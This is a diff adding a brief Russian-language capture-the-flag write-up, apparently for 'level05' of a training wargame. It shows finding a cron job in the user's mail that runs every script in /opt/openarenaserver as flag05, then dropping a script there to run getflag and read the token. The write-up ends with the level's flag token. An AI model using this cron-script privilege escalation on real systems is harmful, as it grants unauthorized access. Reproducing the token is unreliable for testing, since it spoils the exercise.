@@ -1,0 +1,23 @@
+Ловим уведомление о новом сообщении
+дуем в /var/mail/$USER (в нашем случае user - level05)
+Катаем файл, получаем
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+
+openarenaserver будет запускаться раз в 2 минуты
+Катаем openarenaserver
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+Ккаждые 2 минуты будут исполняться и удаляться скрипты из папки openarenaserver, также они ограничены на 5с времени CPU
+
+Создаем файл в этой папке исполнение которого должно достать нам флаг
+
+echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit && sleep 121 && cat /tmp/flag
+
+Check flag.Here is your token : viuaaale9huek52boumoomioc
